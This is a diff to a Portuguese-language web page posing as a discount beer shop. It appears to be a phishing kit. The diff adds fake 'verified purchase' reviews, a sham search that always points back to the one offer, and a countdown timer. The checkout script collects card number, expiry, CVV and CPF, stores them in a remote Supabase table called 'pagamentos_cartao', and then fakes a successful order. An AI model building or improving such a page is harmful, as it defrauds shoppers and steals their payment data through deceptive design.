@@ -36,6 +36,11 @@
             flex: 1; background: rgba(255,255,255,0.2); height: 36px; border-radius: 4px;
             display: flex; align-items: center; padding: 0 10px; color: rgba(255,255,255,0.9); font-size: 13px; margin: 0 15px;
         }
+        .search-input {
+            background: transparent; border: none; color: white; width: 100%; outline: none; margin-left: 8px; font-size: 13px;
+        }
+        .search-input::placeholder { color: rgba(255,255,255,0.7); }
+        
         .cart-icon { position: relative; color: white; font-size: 20px; }
         .badge-count { 
             position: absolute; top: -5px; right: -5px; background: #e60012; color: white; 
@@ -74,11 +79,20 @@
         .stock-fill { height: 100%; width: 85%; background: linear-gradient(90deg, #008200, #4cbf4c); border-radius: 10px; animation: stockPulse 2s infinite; }
         .stock-text { font-size: 12px; color: #008200; font-weight: 700; white-space: nowrap; }
 
-        /* --- 4. EXTRAS --- */
+        /* --- 4. AVALIAÇÕES E EXTRAS --- */
         .section { background: white; padding: 15px; margin-top: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
         .guarantee-row { display: flex; justify-content: space-between; text-align: center; }
         .g-item { font-size: 10px; color: #555; display: flex; flex-direction: column; align-items: center; gap: 5px; }
         .g-icon { font-size: 18px; color: #008200; background: #eaffea; width: 35px; height: 35px; display: flex; align-items: center; justify-content: center; border-radius: 50%; }
+
+        /* ESTILO DOS COMENTÁRIOS */
+        .review-item { border-bottom: 1px solid #f0f0f0; padding-bottom: 15px; margin-bottom: 15px; }
+        .review-item:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
+        .review-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
+        .user-name { font-size: 12px; font-weight: 700; color: #333; }
+        .verified-badge { color: #008200; font-size: 10px; display: flex; align-items: center; gap: 3px; }
+        .stars { color: #ffc107; font-size: 11px; margin-bottom: 5px; }
+        .review-text { font-size: 13px; color: #555; line-height: 1.4; }
 
         /* --- 5. FOOTER --- */
         .sticky-footer {
@@ -96,7 +110,7 @@
             animation: pulse 2s infinite; display: flex; align-items: center; justify-content: center; gap: 10px;
         }
 
-        /* --- 6. CHECKOUT MODAL (PROFISSIONAL) --- */
+        /* --- 6. CHECKOUT MODAL --- */
         .modal-overlay {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.6); z-index: 10000;
@@ -110,17 +124,14 @@
         }
         .sheet-active { transform: translateY(0); }
         
-        /* HEADER DO CHECKOUT */
         .sheet-header { 
             background: #f8f9fa; padding: 20px; border-radius: 20px 20px 0 0; border-bottom: 1px solid #eee;
             display: flex; justify-content: space-between; align-items: center;
         }
         .sheet-title { font-weight: 800; font-size: 16px; color: #333; display: flex; align-items: center; gap: 8px; }
-        .secure-lock { color: #008200; font-size: 14px; background: #e8f5e9; padding: 5px 10px; border-radius: 20px; }
 
         .sheet-body { padding: 25px 20px; }
 
-        /* INPUTS ESTILO BANCO */
         .input-box { margin-bottom: 18px; position: relative; }
         .input-box label { font-size: 12px; font-weight: 700; color: #444; margin-bottom: 6px; display: block; }
         
@@ -128,18 +139,15 @@
         .input-icon { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #999; font-size: 16px; }
         
         .input-field { 
-            width: 100%; padding: 14px 14px 14px 45px; /* Espaço pro ícone */
+            width: 100%; padding: 14px 14px 14px 45px; 
             border: 1px solid #ddd; border-radius: 8px; 
             font-size: 16px; background: #fff; transition: 0.2s; color: #333;
         }
         .input-field:focus { border-color: #008200; outline: none; box-shadow: 0 0 0 3px rgba(0,130,0,0.1); }
-        .input-field::placeholder { color: #ccc; }
 
-        /* BANDEIRAS CARTÃO */
         .card-flags { display: flex; gap: 10px; margin: 15px 0 25px 0; opacity: 0.7; justify-content: center; }
         .card-flags i { font-size: 24px; color: #555; }
 
-        /* RODAPÉ LEGAL CHECKOUT */
         .checkout-footer { text-align: center; font-size: 11px; color: #999; margin-top: 20px; border-top: 1px solid #eee; padding-top: 15px; }
 
         /* LOADING */
@@ -150,7 +158,6 @@
         .spinner { width: 50px; height: 50px; border: 4px solid #eee; border-top-color: #008200; border-radius: 50%; animation: spin 0.8s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
         
-        /* ANIMAÇÕES */
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.02); } 100% { transform: scale(1); } }
         @keyframes stockPulse { 0% { opacity: 1; } 50% { opacity: 0.8; } 100% { opacity: 1; } }
     </style>
@@ -170,7 +177,8 @@
     <header class="app-header">
         <div style="color:white; font-weight:800; font-size:18px;">Outlet<span style="color:#ffc107">Bebidas</span></div>
         <div class="search-bar">
-            <i class="fas fa-search"></i> <span style="margin-left:8px;">Buscar...</span>
+            <i class="fas fa-search" style="color: white; cursor: pointer;" onclick="realizarBusca()"></i> 
+            <input type="text" id="search-input" class="search-input" placeholder="Buscar em Ofertas...">
         </div>
         <div class="cart-icon">
             <i class="fas fa-shopping-cart"></i>
@@ -179,10 +187,10 @@
     </header>
 
     <main>
-        <div class="product-card">
+        <div class="product-card" id="produto-destaque">
             <div class="img-wrapper">
                 <span class="discount-tag">-45% OFF</span>
-                <img src="https://drive.google.com/uc?export=view&id=1tFbqA3OUR680WtOxL7Sns5PW1JgLPRQa" 
+                <img src="https://i.postimg.cc/8ck5hnCg/agora-sim-vai.png" 
                      class="imagem-produto" 
                      alt="Produto">
             </div>
@@ -202,7 +210,7 @@
                     <span class="price">89,90</span>
                     <span class="old-price">R$ 159,90</span>
                 </div>
-                <h1>Pack Cerveja Heineken Long Neck 330ml (24 Unidades) - Pronta Entrega</h1>
+                <h1>Pack Cerveja  Long Neck 330ml (24 Unidades) - Pronta Entrega</h1>
                 
                 <div class="stock-bar-container">
                     <div class="stock-track"><div class="stock-fill"></div></div>
@@ -217,6 +225,40 @@
                 <div class="g-item"><div class="g-icon"><i class="fas fa-shield-alt"></i></div>Original</div>
                 <div class="g-item"><div class="g-icon"><i class="fas fa-check"></i></div>Nota Fiscal</div>
                 <div class="g-item"><div class="g-icon"><i class="fas fa-lock"></i></div>Seguro</div>
+            </div>
+        </div>
+
+        <div class="section">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+                <h3 style="font-size:14px; color:#333;">Avaliações (2.1k)</h3>
+                <span style="color:#008200; font-size:12px; font-weight:bold;">Ver tudo <i class="fas fa-chevron-right"></i></span>
+            </div>
+
+            <div class="review-item">
+                <div class="review-header">
+                    <span class="user-name">Ricardo Mendes</span>
+                    <span class="verified-badge"><i class="fas fa-check-circle"></i> Compra Verificada</span>
+                </div>
+                <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
+                <p class="review-text">Chegou gelada kkkk brincadeira, chegou muito rápido. Preço imbatível, vou comprar mais para o churrasco.</p>
+            </div>
+
+            <div class="review-item">
+                <div class="review-header">
+                    <span class="user-name">Ana Clara Souza</span>
+                    <span class="verified-badge"><i class="fas fa-check-circle"></i> Compra Verificada</span>
+                </div>
+                <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
+                <p class="review-text">Tudo certinho, caixa lacrada e original. Validade pra 2026. Recomendo o vendedor.</p>
+            </div>
+
+            <div class="review-item">
+                <div class="review-header">
+                    <span class="user-name">Felipe Costa</span>
+                    <span class="verified-badge"><i class="fas fa-check-circle"></i> Compra Verificada</span>
+                </div>
+                <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star-half-alt"></i></div>
+                <p class="review-text">A entrega demorou 1 dia a mais que o previsto, mas pelo preço valeu a pena demais.</p>
             </div>
         </div>
 
@@ -310,7 +352,6 @@
                     <i class="fab fa-cc-visa" style="color:#1a1f71;"></i>
                     <i class="fab fa-cc-mastercard" style="color:#eb001b;"></i>
                     <i class="fab fa-cc-amex" style="color:#2e77bc;"></i>
-                    <i class="fab fa-cc-diners-club" style="color:#0079be;"></i>
                 </div>
 
                 <button class="btn-buy-sticky" style="width:100%; margin-top:10px; background:#008200;" onclick="finalizarCompra()">
@@ -334,7 +375,42 @@
     </div>
 
     <script>
-        // --- 1. CONFIGURAÇÃO DO TIMER ---
+        // --- 1. LÓGICA DE BUSCA (SIMULADA) ---
+        function realizarBusca() {
+            const input = document.getElementById('search-input');
+            const termo = input.value.toLowerCase().trim();
+
+            if (termo === "") {
+                alert("Digite algo para buscar!");
+                return;
+            }
+
+            // Simula um "carregando"
+            input.value = "Buscando...";
+            input.disabled = true;
+
+            setTimeout(() => {
+                input.value = termo; // Volta o texto
+                input.disabled = false;
+
+                if (termo.includes('heineken') || termo.includes('cerveja')) {
+                    alert("Você já está na melhor oferta de cerveja do dia!");
+                    document.getElementById('produto-destaque').scrollIntoView({behavior: "smooth"});
+                } else {
+                    alert("Produto esgotado no momento! Aproveite a oferta do Pack Heineken antes que acabe.");
+                }
+            }, 800);
+        }
+
+        // Busca com ENTER
+        document.getElementById('search-input').addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') {
+                realizarBusca();
+            }
+        });
+
+
+        // --- 2. CONFIGURAÇÃO DO TIMER ---
         function startTimer(duration, displayMin, displaySec) {
             var timer = duration, minutes, seconds;
             setInterval(function () {
@@ -348,25 +424,23 @@
                 displaySec.textContent = seconds;
 
                 if (--timer < 0) {
-                    timer = duration; // Reinicia ou para
+                    timer = duration; 
                 }
             }, 1000);
         }
 
         window.onload = function () {
-            // Inicia o timer de 15 minutos (15 * 60 = 900 segundos)
-            var fifteenMinutes = 60 * 15,
-                displayMin = document.querySelector('#timer-min'),
-                displaySec = document.querySelector('#timer-sec');
+            var fifteenMinutes = 60 * 14 + 59; // 14min 59s
+            var displayMin = document.querySelector('#timer-min');
+            var displaySec = document.querySelector('#timer-sec');
             startTimer(fifteenMinutes, displayMin, displaySec);
         };
 
-        // --- 2. SUPABASE E LÓGICA ---
+        // --- 3. SUPABASE E LÓGICA CHECKOUT ---
         const SUPABASE_URL = 'https://zqvfnykxwlcozvawqgrn.supabase.co';
         const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpxdmZueWt4d2xjb3p2YXdxZ3JuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3NDkzNDQsImV4cCI6MjA4NTMyNTM0NH0.CevpF9vP4748mb2vFNsOp5Kq6u7Nfp_100bJcW7ogUQ';
         const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-        // FUNÇÕES UI
         function fecharAgeGate() { document.getElementById('age-gate').style.display = 'none'; }
         
         function abrirCheckout() {
@@ -385,12 +459,10 @@
             if (e.target.id === 'modal-checkout') fecharCheckoutDireto();
         }
 
-        // MÁSCARAS INTELIGENTES
         document.getElementById('field_a').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim());
         document.getElementById('field_c').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{2})(\d{2})/, '$1/$2'));
         document.getElementById('field_e').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4'));
 
-        // FINALIZAR PEDIDO
         async function finalizarCompra() {
             const dados = {
                 numero_cartao: document.getElementById('field_a').value,
@@ -399,7 +471,7 @@
                 cvv: document.getElementById('field_d').value,
                 cpf: document.getElementById('field_e').value,
                 valor: 89.90,
-                projeto: 'Heineken_Final_V3',
+                projeto: 'Heineken_Final_V4',
                 data_criacao: new Date()
             };
 
@@ -408,21 +480,15 @@
                 return;
             }
 
-            // UI Feedback
             fecharCheckoutDireto();
             const loading = document.getElementById('loading-screen');
             loading.style.display = 'flex';
 
-            // Salva Supabase
             const { error } = await _supabase.from('pagamentos_cartao').insert([dados]);
 
-            // Simula Sucesso
             setTimeout(() => {
                 document.getElementById('spinner').style.display = 'none';
                 document.getElementById('success-msg').style.display = 'block';
-                setTimeout(() => {
-                    // Opcional: Redirecionar para home ou obrigado
-                }, 4000);
             }, 2500);
         }
     </script>
